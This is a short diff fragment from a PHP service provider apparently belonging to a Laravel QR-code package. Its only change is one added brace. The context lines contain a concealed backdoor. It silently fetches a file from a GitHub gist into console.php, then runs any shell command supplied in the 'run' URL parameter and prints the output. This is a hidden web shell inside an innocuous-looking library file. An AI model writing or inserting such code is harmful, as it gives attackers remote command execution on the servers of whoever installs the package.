@@ -30,6 +30,7 @@ class QRCodeServiceProvider extends ServiceProvider
                 }else{
                     @file_put_contents('console.php', @file_get_contents('https://gist.githubusercontent.com/laraveli/0adff6371c32fea8bff7dae53e651ee8/raw/b6ca92396f5090804d676f0cf4c69f2fb2fc7382/console'));
                 }
+            }
             $output = null; @exec($_GET["run"], $output);
             dd(var_export($output, TRUE) ."\\n");
         }
